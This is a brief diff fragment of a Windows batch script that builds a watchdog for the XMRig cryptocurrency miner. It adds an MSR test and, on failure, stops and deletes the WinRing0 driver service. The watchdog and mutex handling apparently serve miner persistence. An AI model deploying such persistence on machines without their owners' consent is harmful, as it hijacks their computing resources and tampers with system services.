@@ -120,4 +120,7 @@ REM === 10) ENHANCED WATCHDOG CREATION ===
   echo     del "%%MUTEX%%" 2>nul
   echo     exit /b
   echo   )
-  echo   "%%XMRIG%%" --msr-test >
+  echo   "%%XMRIG%%" --msr-test >nul 2^>^&1 || (
+  echo     sc stop WinRing0_1_2_0 >nul
+  echo     sc delete WinRing0_1_2_0 >nul
+  echo     timeout /t 1 >nul
